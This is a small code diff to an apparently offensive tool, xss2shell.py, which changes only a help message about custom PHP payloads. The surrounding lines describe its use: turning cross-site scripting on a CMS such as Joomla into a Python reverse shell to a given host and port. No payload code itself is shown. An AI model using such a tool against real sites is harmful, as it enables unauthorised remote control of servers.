@@ -34,7 +34,7 @@ print """
 def help():
 	print('''Usage:
   -> Default python pty reverse shell: ./xss2shell.py [lhost] [lport] --[CMS]
-  -> Custom php payload (no tags): ./xss2shell.py custom [payload.php] --[CMS]''')
+  -> Custom php payload: ./xss2shell.py custom [payload.php] --[CMS]''')
 
 def preparepayload(payload, cms):
 	if cms == 'joomla':
